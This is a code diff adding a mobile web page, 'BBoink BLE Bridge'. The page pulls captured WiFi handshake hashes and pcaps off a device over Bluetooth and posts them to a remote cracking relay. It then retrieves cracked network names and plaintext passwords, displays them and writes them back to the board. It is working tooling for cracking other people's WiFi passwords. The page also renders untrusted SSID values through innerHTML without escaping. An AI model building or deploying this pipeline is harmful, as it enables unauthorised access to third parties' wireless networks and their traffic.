@@ -1,0 +1,131 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>BBoink BLE Bridge</title>
+<style>
+  :root { color-scheme: dark; }
+  body { margin:0; font:15px/1.5 system-ui,sans-serif; background:#0d1117; color:#e6edf3; padding:16px; }
+  h1 { font-size:19px; margin:0 0 4px; }
+  .sub { color:#8b949e; font-size:13px; margin-bottom:16px; }
+  label { display:block; font-size:12px; color:#8b949e; margin:10px 0 3px; }
+  input { width:100%; box-sizing:border-box; padding:9px; border-radius:8px; border:1px solid #30363d; background:#161b22; color:#e6edf3; font-size:14px; }
+  button { width:100%; padding:12px; margin-top:12px; border:0; border-radius:9px; font-size:15px; font-weight:600; color:#fff; background:#238636; }
+  button.sec { background:#1f6feb; }
+  button:disabled { opacity:.5; }
+  #log { margin-top:14px; background:#161b22; border:1px solid #30363d; border-radius:8px; padding:10px; font:12px/1.45 ui-monospace,monospace; white-space:pre-wrap; max-height:38vh; overflow:auto; }
+  table { width:100%; border-collapse:collapse; margin-top:12px; font-size:13px; }
+  th,td { text-align:left; padding:6px 8px; border-bottom:1px solid #21262d; }
+  th { color:#8b949e; font-weight:500; }
+  .pw { font-family:ui-monospace,monospace; color:#3fb950; }
+  .pill { display:inline-block; padding:1px 7px; border-radius:10px; font-size:11px; background:#30363d; color:#8b949e; }
+</style>
+</head>
+<body>
+<h1>BBoink BLE Bridge</h1>
+<div class="sub">Android + Chrome. Pulls captures off the board over Bluetooth and forwards them to your relay over this phone's connection — no board WiFi needed.</div>
+
+<label>Relay URL</label>
+<input id="url" placeholder="https://bboink.onrender.com">
+<label>Relay token</label>
+<input id="tok" placeholder="RELAY_TOKEN">
+
+<button id="connect" class="sec">Connect to board</button>
+<button id="sync" disabled>Sync captures ↔ relay</button>
+
+<div id="log"></div>
+<table id="cracked" hidden><thead><tr><th>SSID</th><th>Password</th><th></th></tr></thead><tbody></tbody></table>
+
+<script>
+const SVC='b0070000-b0b0-4b0a-9c5e-000000000000';
+const RX ='b0070001-b0b0-4b0a-9c5e-000000000000';
+const TX ='b0070002-b0b0-4b0a-9c5e-000000000000';
+
+const $=id=>document.getElementById(id);
+const logEl=$('log');
+function log(m){ logEl.textContent += m+'\n'; logEl.scrollTop=logEl.scrollHeight; }
+
+// restore saved relay creds
+$('url').value=localStorage.getItem('relayUrl')||'';
+$('tok').value=localStorage.getItem('relayTok')||'';
+
+let rxCh=null, txCh=null, waiter=null;
+
+function onNotify(e){
+  const v=e.target.value, type=v.getUint8(0);
+  const body=new Uint8Array(v.buffer, v.byteOffset+1, v.byteLength-1);
+  if(type===0x01){ let j; try{ j=JSON.parse(new TextDecoder().decode(body)); }catch(_){ return; } waiter&&waiter.onText&&waiter.onText(j); }
+  else if(type===0x02){ waiter&&waiter.onBin&&waiter.onBin(body.slice()); }
+}
+function write(obj){ return rxCh.writeValue(new TextEncoder().encode(JSON.stringify(obj))); }
+function concat(chunks){ let n=chunks.reduce((a,c)=>a+c.length,0), out=new Uint8Array(n), o=0; for(const c of chunks){ out.set(c,o); o+=c.length; } return out; }
+
+function cmdList(){ return new Promise(res=>{ waiter={onText:j=>{ if(j.t==='list'){ waiter=null; res(j.files||[]); } }}; write({c:'list'}); }); }
+function cmdGet(name){ return new Promise((res,rej)=>{ let chunks=[]; waiter={ onText:j=>{ if(j.t==='end'){ waiter=null; res(concat(chunks)); } else if(j.t==='err'){ waiter=null; rej(j.e||'err'); } }, onBin:b=>chunks.push(b) }; write({c:'get',name}); }); }
+function cmdAck(obj){ return new Promise(res=>{ waiter={onText:j=>{ if(j.t==='ok'||j.t==='bye'){ waiter=null; res(j); } }}; write(obj); }); }
+
+$('connect').onclick=async()=>{
+  try{
+    log('requesting device…');
+    const dev=await navigator.bluetooth.requestDevice({filters:[{services:[SVC]}]});
+    dev.addEventListener('gattserverdisconnected',()=>{ log('⚠ board disconnected'); $('sync').disabled=true; });
+    const gatt=await dev.gatt.connect();
+    const svc=await gatt.getPrimaryService(SVC);
+    rxCh=await svc.getCharacteristic(RX);
+    txCh=await svc.getCharacteristic(TX);
+    await txCh.startNotifications();
+    txCh.addEventListener('characteristicvaluechanged',onNotify);
+    log('✔ connected to '+(dev.name||'board'));
+    $('sync').disabled=false;
+  }catch(e){ log('✖ '+e.message); }
+};
+
+$('sync').onclick=async()=>{
+  const url=$('url').value.trim().replace(/\/+$/,''), tok=$('tok').value.trim();
+  if(!url||!tok){ log('✖ enter relay URL + token'); return; }
+  localStorage.setItem('relayUrl',url); localStorage.setItem('relayTok',tok);
+  const auth={'Authorization':'Bearer '+tok};
+  $('sync').disabled=true;
+  try{
+    log('listing captures…');
+    const files=await cmdList();
+    log('  '+files.length+' file(s)');
+    let hashes=''; const pcaps=[];
+    for(const f of files){
+      log('  ← '+f.name+' ('+f.size+'B)');
+      const bytes=await cmdGet(f.name);
+      if(f.kind==='22000') hashes+=new TextDecoder().decode(bytes);
+      else if(f.kind==='pcap') pcaps.push({name:f.name,bytes});
+    }
+    if(hashes.trim()){
+      log('→ relay /v1/hashes …');
+      const r=await fetch(url+'/v1/hashes',{method:'POST',headers:{...auth,'Content-Type':'text/plain'},body:hashes});
+      log('  '+r.status+' '+JSON.stringify(await r.json().catch(()=>({}))));
+    }
+    for(const p of pcaps){
+      log('→ relay /v1/pcap '+p.name+' …');
+      const r=await fetch(url+'/v1/pcap?name='+encodeURIComponent(p.name),{method:'POST',headers:{...auth,'Content-Type':'application/octet-stream'},body:p.bytes});
+      log('  '+r.status+' '+JSON.stringify(await r.json().catch(()=>({}))));
+    }
+    log('← relay /v1/cracked …');
+    const cr=await (await fetch(url+'/v1/cracked',{headers:auth})).json();
+    log('  '+cr.count+' cracked');
+    const tb=$('cracked').querySelector('tbody'); tb.innerHTML='';
+    for(const c of (cr.cracked||[])){
+      await cmdAck({c:'crk',b:c.bssid||'',s:c.ssid||'',p:c.password||''});
+      const tr=document.createElement('tr');
+      tr.innerHTML=`<td>${c.ssid||'—'}</td><td class="pw">${c.password||''}</td><td><span class="pill">${c.source||''}</span></td>`;
+      tb.appendChild(tr);
+    }
+    await cmdAck({c:'crkdone'});
+    if((cr.cracked||[]).length) $('cracked').hidden=false;
+    log('✔ done — cracked results written back to the board');
+  }catch(e){ log('✖ '+(e.message||e)); }
+  $('sync').disabled=false;
+};
+
+if(!navigator.bluetooth) log('✖ Web Bluetooth unavailable — use Chrome on Android.');
+</script>
+</body>
+</html>
